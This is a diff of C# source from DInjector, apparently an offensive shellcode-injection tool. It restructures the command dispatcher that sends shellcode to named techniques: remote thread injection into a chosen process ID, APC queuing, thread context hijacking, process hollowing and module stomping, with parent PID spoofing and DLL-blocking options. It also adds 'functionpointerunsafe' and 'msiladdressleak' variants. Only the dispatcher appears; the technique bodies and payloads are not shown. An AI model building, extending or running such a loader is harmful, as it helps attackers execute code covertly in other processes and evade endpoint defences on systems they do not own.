@@ -147,80 +147,91 @@ namespace DInjector
             catch (Exception)
             { }
 
-            switch (commandName.ToLower())
+            try
             {
-                case "functionpointer":
-                    FunctionPointer.Execute(shellcodeBytes);
-                    break;
-                case "functionpointerv2":
-                    FunctionPointerV2.Execute(shellcodeBytes);
-                    break;
-                case "clipboardpointer":
-                    ClipboardPointer.Execute(shellcodeBytes);
-                    break;
-                case "currentthread":
-                    CurrentThread.Execute(shellcodeBytes);
-                    break;
-                case "currentthreaduuid":
-                    string shellcodeUuids = System.Text.Encoding.UTF8.GetString(shellcodeBytes);
-                    CurrentThreadUuid.Execute(shellcodeUuids);
-                    break;
-                case "remotethread":
-                    RemoteThread.Execute(
-                        shellcodeBytes,
-                        int.Parse(options["/pid"]));
-                    break;
-                case "remotethreaddll":
-                    RemoteThreadDll.Execute(
-                        shellcodeBytes,
-                        int.Parse(options["/pid"]),
-                        options["/dll"]);
-                    break;
-                case "remotethreadview":
-                    RemoteThreadView.Execute(
-                        shellcodeBytes,
-                        int.Parse(options["/pid"]));
-                    break;
-                case "remotethreadsuspended":
-                    RemoteThreadSuspended.Execute(
-                        shellcodeBytes,
-                        int.Parse(options["/pid"]));
-                    break;
-                case "remotethreadkernelcb":
-                    RemoteThreadKernelCB.Execute(
-                        shellcodeBytes,
-                        int.Parse(options["/pid"]));
-                    break;
-                case "remotethreadapc":
-                    RemoteThreadAPC.Execute(
-                        shellcodeBytes,
-                        options["/image"],
-                        ppid,
-                        blockDlls);
-                    break;
-                case "remotethreadcontext":
-                    RemoteThreadContext.Execute(
-                        shellcodeBytes,
-                        options["/image"],
-                        ppid,
-                        blockDlls);
-                    break;
-                case "processhollowing":
-                    ProcessHollowing.Execute(
-                        shellcodeBytes,
-                        options["/image"],
-                        ppid,
-                        blockDlls);
-                    break;
-                case "modulestomping":
-                    ModuleStomping.Execute(
-                        shellcodeBytes,
-                        options["/image"],
-                        options["/stomp"],
-                        options["/export"],
-                        ppid,
-                        blockDlls);
-                    break;
+                switch (commandName.ToLower())
+                {
+                    case "functionpointer":
+                        FunctionPointer.Execute(shellcodeBytes);
+                        break;
+                    case "functionpointerunsafe":
+                        FunctionPointerUnsafe.Execute(shellcodeBytes);
+                        break;
+                    case "msiladdressleak":
+                        MSILAddressLeak.Execute(shellcodeBytes);
+                        break;
+                    case "clipboardpointer":
+                        ClipboardPointer.Execute(shellcodeBytes);
+                        break;
+                    case "currentthread":
+                        CurrentThread.Execute(shellcodeBytes);
+                        break;
+                    case "currentthreaduuid":
+                        string shellcodeUuids = System.Text.Encoding.UTF8.GetString(shellcodeBytes);
+                        CurrentThreadUuid.Execute(shellcodeUuids);
+                        break;
+                    case "remotethread":
+                        RemoteThread.Execute(
+                            shellcodeBytes,
+                            int.Parse(options["/pid"]));
+                        break;
+                    case "remotethreaddll":
+                        RemoteThreadDll.Execute(
+                            shellcodeBytes,
+                            int.Parse(options["/pid"]),
+                            options["/dll"]);
+                        break;
+                    case "remotethreadview":
+                        RemoteThreadView.Execute(
+                            shellcodeBytes,
+                            int.Parse(options["/pid"]));
+                        break;
+                    case "remotethreadsuspended":
+                        RemoteThreadSuspended.Execute(
+                            shellcodeBytes,
+                            int.Parse(options["/pid"]));
+                        break;
+                    case "remotethreadkernelcb":
+                        RemoteThreadKernelCB.Execute(
+                            shellcodeBytes,
+                            int.Parse(options["/pid"]));
+                        break;
+                    case "remotethreadapc":
+                        RemoteThreadAPC.Execute(
+                            shellcodeBytes,
+                            options["/image"],
+                            ppid,
+                            blockDlls);
+                        break;
+                    case "remotethreadcontext":
+                        RemoteThreadContext.Execute(
+                            shellcodeBytes,
+                            options["/image"],
+                            ppid,
+                            blockDlls);
+                        break;
+                    case "processhollowing":
+                        ProcessHollowing.Execute(
+                            shellcodeBytes,
+                            options["/image"],
+                            ppid,
+                            blockDlls);
+                        break;
+                    case "modulestomping":
+                        ModuleStomping.Execute(
+                            shellcodeBytes,
+                            options["/image"],
+                            options["/stomp"],
+                            options["/export"],
+                            ppid,
+                            blockDlls);
+                        break;
+                }
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+                Console.WriteLine(e.InnerException);
             }
         }
 
